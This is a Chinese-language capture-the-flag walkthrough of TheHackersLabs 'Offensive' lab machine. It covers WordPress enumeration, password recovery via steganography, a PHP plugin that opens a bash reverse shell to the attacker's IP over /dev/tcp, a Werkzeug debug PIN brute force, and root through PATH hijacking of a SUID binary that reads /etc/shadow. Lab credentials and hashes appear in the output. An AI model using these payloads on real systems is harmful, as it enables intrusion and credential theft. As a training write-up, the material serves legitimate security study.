# thl_Offensive

**靶机**：[thehackerslabs - offensive](https://thehackerslabs.com/offensive/)
**难度**：专业（PROFESIONAL）
**目标 IP**：192.168.205.220
**本机 IP**：192.168.205.141

---

## 1. 端口枚举及服务探测

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.220
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 11:32 CST
Nmap scan report for 192.168.205.220
Host is up (0.00034s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
8080/tcp open  http    Node.js Express framework
MAC Address: 08:00:27:B1:A8:86 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.68 seconds
```

从 `nmap` 扫描结果来看，目标机器开放了 **22** (SSH) 、 **80** (HTTP) 端口、**8080**(HTTP) 端口。

其中80是**Apache httpd 2.4.62**的服务，8080是**Node.js 架构**，我们上去网页看看

---

## 2.踩点

### 80端口

![image](https://github.com/user-attachments/assets/819ee2bc-b088-4fae-bf3a-085e6092abf4)

明显可以看出有一个域名`offensive.thl`加入我们的hosts文件中，继续踩点可以发现，这个网页是个博客，那我们探测一下架构。

```bash
└─$ whatweb http://offensive.thl/       
http://offensive.thl/ [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.205.220], MetaGenerator[WordPress 6.7.1], Script, Title[rodgar], UncommonHeaders[link], WordPress[6.7.1]

```

是**WordPress 6.7.1**的，我们利用**wpscan**进行探测

```bash
┌──(kali㉿kali)-[~/test]
└─$ wpscan --url http://offensive.thl -e vp,u --api-token xxx   #api-token注册wpscan官网获取
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://offensive.thl/ [192.168.205.220]
[+] Started: Wed Jan  1 12:51:58 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.62 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://offensive.thl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://offensive.thl/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://offensive.thl/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[+] WordPress theme in use: gentlemens-club
 | Location: http://offensive.thl/wp-content/themes/gentlemens-club/
 | Latest Version: 1.0.0 (up to date)
 | Last Updated: 2024-09-25T00:00:00.000Z
 | Readme: http://offensive.thl/wp-content/themes/gentlemens-club/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://offensive.thl/wp-content/themes/gentlemens-club/style.css
 | Style Name: Gentlemen's Club
 | Description: Theme with a simple design, extremely linear and clean. A space reserved for the private club. The p...
 | Author: masino1967
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://offensive.thl/wp-content/themes/gentlemens-club/style.css, Match: 'Version: 1.0.0'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=========================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] administrator
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://offensive.thl/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 0
 | Requests Remaining: 19

[+] Finished: Wed Jan  1 12:52:18 2025
[+] Requests Done: 56
[+] Cached Requests: 8
[+] Data Sent: 11.653 KB
[+] Data Received: 288.726 KB
[+] Memory used: 268.75 MB
[+] Elapsed time: 00:00:19
                                                  
```

获得一个用户名`administrator`，就没有其他重要的信息了，我们进行爆破一下密码

```bash
┌──(kali㉿kali)-[~/test]
└─$ wpscan --url http://offensive.thl -U administrator -P /usr/share/wordlists/rockyou.txt --api-token xxx   #api-token注册wpscan官网获取
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://offensive.thl/ [192.168.205.220]
[+] Started: Wed Jan  1 12:54:01 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.62 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://offensive.thl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://offensive.thl/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://offensive.thl/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[+] WordPress theme in use: gentlemens-club
 | Location: http://offensive.thl/wp-content/themes/gentlemens-club/
 | Latest Version: 1.0.0 (up to date)
 | Last Updated: 2024-09-25T00:00:00.000Z
 | Readme: http://offensive.thl/wp-content/themes/gentlemens-club/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://offensive.thl/wp-content/themes/gentlemens-club/style.css
 | Style Name: Gentlemen's Club
 | Description: Theme with a simple design, extremely linear and clean. A space reserved for the private club. The p...
 | Author: masino1967
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://offensive.thl/wp-content/themes/gentlemens-club/style.css, Match: 'Version: 1.0.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <========================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[i] Could not find a login interface to perform the password attack against

[i] No Valid Passwords Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 0
 | Requests Remaining: 18

[+] Finished: Wed Jan  1 12:54:04 2025
[+] Requests Done: 142
[+] Cached Requests: 39
[+] Data Sent: 29.128 KB
[+] Data Received: 21.362 KB
[+] Memory used: 245.344 MB
[+] Elapsed time: 00:00:03
                   


[i] Could not find a login interface to perform the password attack against

[i] 无法找到登录界面来执行密码攻击
```

不知道为什么找不到，我也无法访问登录点，那我们去探测一下**8080**端口吧。

打开网址，他说无法GET /	怎么看起来像API呀，目录爆破一下。

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://offensive.thl:8080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://offensive.thl:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/help                 (Status: 200) [Size: 203]
/cat                  (Status: 500) [Size: 31]
/Help                 (Status: 200) [Size: 203]
/ls                   (Status: 200) [Size: 176]
/rm                   (Status: 500) [Size: 45]
/Cat                  (Status: 500) [Size: 31]
Progress: 49633 / 6369165 (0.78%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 51095 / 6369165 (0.80%)
===============================================================
Finished
===============================================================

```

查看一下帮助。

![image](https://github.com/user-attachments/assets/aa4bd96d-99b6-4f0c-b204-76a776e4eddb)

可以下载、查看、删除，但是限制在`/var/www`，那我们查看一下有什么文件。

![image](https://github.com/user-attachments/assets/82d60f3a-df63-4105-b95a-8121ca79dea5)

有意思，我们看看**wordress**中有没有我们没有探测出来的**plugins**。

![image](https://github.com/user-attachments/assets/4bd23546-7d72-4ac2-9b55-f3d7b2fa032a)

真多啊，我比较对`akismet`、`wps-hide-login`、`wpterm`感兴趣，搜索一下他们有没有漏洞。

```bash
┌──(kali㉿kali)-[~/test]
└─$ searchsploit akismet
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Akismet - Multiple Cross-Site Scripting Vulnerabilities                             | php/webapps/37902.php
WordPress Plugin Akismet 2.1.3 - Cross-Site Scripting                                                | php/webapps/30036.html
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ searchsploit wps-hide-login 
Exploits: No Results
Shellcodes: No Results
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ searchsploit wpterm     
Exploits: No Results
Shellcodes: No Results
                                
```

只有一个跨站点，我们用不上，但是我发现了点问题，`wps-hide-login`是什么东西啊，触发了我关键词，搜索一下。

![image](https://github.com/user-attachments/assets/a014b2ce-d98a-4762-b648-65d6dbdb956b)

原来就是你让我爆破不了[生气]，进你目录看看。

![image](https://github.com/user-attachments/assets/40a293ec-8fc3-474b-92fe-4d19af4a276f)

得到了一个版本号，我去搜索了一下`wps-hide-login`的exploit，没有这个版本的，这个是最新版，难办了......

我忽然想到一个问题，以前搭博客加插件的话，如果那个插件不要了，直接把那个目录删了它就会消失，我不知道**WordPress**是不是这种机制，试试吧，不行就重装

![image](https://github.com/user-attachments/assets/ab524259-acc2-4c3f-820e-620e26da7e1b)

尝试可不可以登录。

![image](https://github.com/user-attachments/assets/b6592349-bf94-430b-ad0c-214e4b453084)

还真行，再爆破一次密码。

```bash
┌──(kali㉿kali)-[~/test]
└─$ wpscan --url http://offensive.thl:80 -U administrator -P /usr/share/wordlists/rockyou.txt --api-token xxx   #api-token注册wpscan官网获取
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://offensive.thl/ [192.168.205.220]
[+] Started: Wed Jan  1 13:23:14 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.62 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://offensive.thl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://offensive.thl/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://offensive.thl/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[+] WordPress theme in use: gentlemens-club
 | Location: http://offensive.thl/wp-content/themes/gentlemens-club/
 | Latest Version: 1.0.0 (up to date)
 | Last Updated: 2024-09-25T00:00:00.000Z
 | Readme: http://offensive.thl/wp-content/themes/gentlemens-club/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://offensive.thl/wp-content/themes/gentlemens-club/style.css
 | Style Name: Gentlemen's Club
 | Description: Theme with a simple design, extremely linear and clean. A space reserved for the private club. The p...
 | Author: masino1967
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://offensive.thl/wp-content/themes/gentlemens-club/style.css, Match: 'Version: 1.0.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <========================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
^Cying administrator / ripper Time: 00:01:13 <                                                > (9060 / 14344392)  0.06%  ETA: 32:11:33
[i] No Valid Passwords Found.

^Cying administrator / reyrey Time: 00:01:13 <                                                > (9063 / 14344392)  0.06%  ETA: 32:11:19
Scan Aborted: Canceled by User
                           
```

9000+都爆破不出来，那意思是在什么地方藏着？

```bash
┌──(kali㉿kali)-[~/test]
└─$ wget -r -np http://offensive.thl    
--2025-01-01 13:26:20--  http://offensive.thl/
正在解析主机 offensive.thl (offensive.thl)... 192.168.205.220
正在连接 offensive.thl (offensive.thl)|192.168.205.220|:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：未指定 [text/html]
正在保存至: “offensive.thl/index.html”

```

下载了一份网页没有结果，我记得好像那个API可以下载来着，下载一份下来。

![image](https://github.com/user-attachments/assets/49ced356-5769-4985-b669-e50f078a45ab)

先帝创业未半而中道崩殂，mmp，那没办法了，就在这个API探索吧。

![image](https://github.com/user-attachments/assets/e2d52fcf-8201-41ec-9a5b-3c5551238f38)

在`/image/`目录下找到一个有意思的图片。

![image](https://github.com/user-attachments/assets/15bb561b-0c31-4141-8f36-47cfb5b579d7)

啊这......属实是文化输出了，哈哈哈。

```bash
┌──(kali㉿kali)-[~/test]
└─$ wget http://offensive.thl/images/wp-login.jpg                     
--2025-01-01 13:34:42--  http://offensive.thl/images/wp-login.jpg
正在解析主机 offensive.thl (offensive.thl)... 192.168.205.220
正在连接 offensive.thl (offensive.thl)|192.168.205.220|:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：648072 (633K) [image/jpeg]
正在保存至: “wp-login.jpg”

wp-login.jpg                      100%[============================================================>] 632.88K  --.-KB/s  用时 0.001s  

2025-01-01 13:34:42 (477 MB/s) - 已保存 “wp-login.jpg” [648072/648072])

                                                                              
┌──(kali㉿kali)-[~/test]
└─$ exiftool wp-login.jpg 
ExifTool Version Number         : 13.00
File Name                       : wp-login.jpg
Directory                       : .
File Size                       : 648 kB
File Modification Date/Time     : 2024:12:25 04:24:46+08:00
File Access Date/Time           : 2025:01:01 13:34:42+08:00
File Inode Change Date/Time     : 2025:01:01 13:34:42+08:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 3840
Image Height                    : 2160
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 3840x2160
Megapixels                      : 8.3
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ stegseek wp-login.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "bestfriend"
[i] Original filename: "wp-login.txt".
[i] Extracting to "wp-login.jpg.out".

                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ cat wp-login.jpg.out
uFQ07kmjImx$)x9HHH3J3Sa5
                    
```

登上去了，提权就简单了，传个Plugins Shell上去

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat wp_reverse.php 
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.205.141/8888 0>&1'");
?>
                         
```

压成压缩包当插件传上去就好了。

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                         
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.220] 57678
bash: cannot set terminal process group (798): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheHackersLabs-Offensive:/var/www/wordpress/wp-admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

---

## 3. 获得稳定的 Shell

获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

---

## 4.提权

```bash
www-data@TheHackersLabs-Offensive:/tmp$ ss -ntlup
Netid                State                 Recv-Q                 Send-Q                                 Local Address:Port                                 Peer Address:Port                Process                                    
udp                  UNCONN                0                      0                                            0.0.0.0:68                                        0.0.0.0:*                                                              
tcp                  LISTEN                0                      4096                                         0.0.0.0:5000                                      0.0.0.0:*                                                              
tcp                  LISTEN                0                      511                                          0.0.0.0:8080                                      0.0.0.0:*                    users:(("node",pid=561,fd=18))            
tcp                  LISTEN                0                      128                                          0.0.0.0:22                                        0.0.0.0:*                                                              
tcp                  LISTEN                0                      80                                         127.0.0.1:3306                                      0.0.0.0:*                                                              
tcp                  LISTEN                0                      128                                             [::]:22                                           [::]:*                                                              
tcp                  LISTEN                0                      511                                                *:80                                              *:*                                                              

```

开了个3306,看看有什么，这可以查到他的mysql密码

```bash
www-data@TheHackersLabs-Offensive:/tmp$ cat /var/www/wordpress/wp-config.php 
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wp_user' );

/** Database password */
define( 'DB_PASSWORD', 'wpManoloPass' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 *
 * At the installation time, database tables are created with the specified prefix.
 * Changing this value after WordPress is installed will make your site think
 * it has not been installed.
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/#table-prefix
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

查看mysql有没有敏感信息

```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
5 rows in set (0.001 sec)

MariaDB [(none)]> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mysql]> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| column_stats              |
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| global_priv               |
| gtid_slave_pos            |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| index_stats               |
| innodb_index_stats        |
| innodb_table_stats        |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| roles_mapping             |
| servers                   |
| slow_log                  |
| table_stats               |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| transaction_registry      |
| user                      |
+---------------------------+

MariaDB [mysql]> SELECT user, host, authentication_string FROM mysql.user;
+-------------+-----------+-------------------------------------------+
| User        | Host      | authentication_string                     |
+-------------+-----------+-------------------------------------------+
| mariadb.sys | localhost |                                           |
| root        | localhost | invalid                                   |
| mysql       | localhost | invalid                                   |
| wp_user     | localhost | *41D869A459C5FC17FE6786D4B639FE7FE528DCC2 |
+-------------+-----------+-------------------------------------------+
4 rows in set (0.001 sec)

MariaDB [wordpress]> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.000 sec)

MariaDB [wordpress]> SELECT user_login, user_pass FROM wp_users;
+---------------+------------------------------------+
| user_login    | user_pass                          |
+---------------+------------------------------------+
| administrator | $P$BPzDdGMVlbK3gPYUUVtbvf0roz4rxX/ |
+---------------+------------------------------------+
1 row in set (0.000 sec)


```

下班，什么都没有。实在找不到甩了一个linpeas.sh过来,没有什么有价值的东西，但是我在看linpeas报告的时候再看了一边开放的端口发现5000端口是开放的，而且我nmap探测没探测出来，应该玄机就在这里，先转发出去先

```bash
www-data@TheHackersLabs-Offensive:/tmp$ socat TCP-LISTEN:1234,fork TCP4:127.0.0.1:5000 &
[1] 20694

```

![image](https://github.com/user-attachments/assets/df8f29f1-fe16-41a2-9bc6-66542f3465bb)

爆破PIN,也就10000种可能（如果你是通过代理的形式转发端口如:`chisel`这种，我建议你直接抄我的PIN，因为代理巨慢，不要问为什么我知道，因为我一开始就是这样干的）

![image](https://github.com/user-attachments/assets/822a8467-e878-4a48-84a9-9f1c8fa38d1c)

PIN为3333的时候长度明显不一样，所以就是3333。

![image](https://github.com/user-attachments/assets/d46a4cc8-8700-4796-baa2-336f1cda0846)

可以执行命令，弹个shell回来。

```bash
maria@TheHackersLabs-Offensive:~$ id
uid=1001(maria) gid=1001(maria) grupos=1001(maria)

```

尝试提权。

```bash
maria@TheHackersLabs-Offensive:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-Offensive: Nombre o servicio desconocido
[sudo] contraseña para maria: 
sudo: a password is required
maria@TheHackersLabs-Offensive:~$ ls -la
total 132
drwx------ 3 maria maria  4096 dic 31 05:35 .
drwxr-xr-x 3 root  root   4096 dic 29 15:41 ..
-rwsr-xr-x 1 root  root  16056 dic 26 10:22 app
-rw-r--r-- 1 maria maria    67 dic 26 11:20 backup.txt
-rw------- 1 maria maria    29 dic 29 15:41 .bash_history
-rw-r--r-- 1 maria maria   220 mar 29  2024 .bash_logout
-rw-r--r-- 1 maria maria  3526 mar 29  2024 .bashrc
-rw-r--r-- 1 maria maria 55646 dic  9  2021 GyMG.jpg
-rw-r--r-- 1 maria maria  4629 dic 27 10:14 index.php
-rw------- 1 maria maria    20 dic 26 11:59 .lesshst
drwxr-xr-x 3 maria maria  4096 dic 25 06:02 .local
-rw-r--r-- 1 maria maria   257 dic 25 18:46 logout.php
-rw-r--r-- 1 maria maria   807 mar 29  2024 .profile
-rw-r--r-- 1 maria maria    29 dic 31 05:35 user.txt
-rw-r--r-- 1 maria maria  4721 dic 27 07:47 welcome.php

```

这个app有点意思。

```bash
maria@TheHackersLabs-Offensive:~$ strings app 
/lib64/ld-linux-x86-64.so.2
puts
setuid
system
__libc_start_main
__cxa_finalize
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
[*] Mostrando las primeras 8 l
neas del archivo /etc/shadow 
/usr/bin/head -n 8 /etc/shadow
head -n 8 /etc/shadow
;*3$"
GCC: (Debian 12.2.0-14) 12.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
app.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
_fini
system@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment

```

像是执行了`head -n 8 /etc/shadow`，我们托去IDA一探真容。

![image](https://github.com/user-attachments/assets/b2985cc2-ac93-42bb-8b22-08668879ff48)

猜的没错，我们命令注入一下。

```bash
maria@TheHackersLabs-Offensive:~$ echo 'chmod u+s /bin/bash' > head
maria@TheHackersLabs-Offensive:~$ chmod +x head 
maria@TheHackersLabs-Offensive:~$ export PATH=/home/maria:$PATH
maria@TheHackersLabs-Offensive:~$ which head 
/home/maria/head
maria@TheHackersLabs-Offensive:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 mar 29  2024 /bin/bash
maria@TheHackersLabs-Offensive:~$ ./app


[*] Mostrando las primeras 8 líneas del archivo /etc/shadow 

root:$y$j9T$2mXNTjVfEEjRt6t2uVu7k0$RBnftcaGot4JsJ8DHVuo0LkG8UuuKR68CdazrjK2Rf8:20088:0:99999:7:::
daemon:*:20066:0:99999:7:::
bin:*:20066:0:99999:7:::
sys:*:20066:0:99999:7:::
sync:*:20066:0:99999:7:::
games:*:20066:0:99999:7:::
man:*:20066:0:99999:7:::
lp:*:20066:0:99999:7:::


[*] Mostrando las primeras 8 líneas del archivo /etc/shadow 

maria@TheHackersLabs-Offensive:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 mar 29  2024 /bin/bash
maria@TheHackersLabs-Offensive:~$ bash -p
bash-5.2# id
uid=1001(maria) gid=1001(maria) euid=0(root) grupos=1001(maria)

```

---

## 5.总结

去瞄了`ll104567`大佬的wp，发现WordPress那里可以使用**wpscan**扫描全部插件

```bash
wpscan --url http://192.168.205.213 -e ap,u --plugins-detection aggressive --api-token xxx
```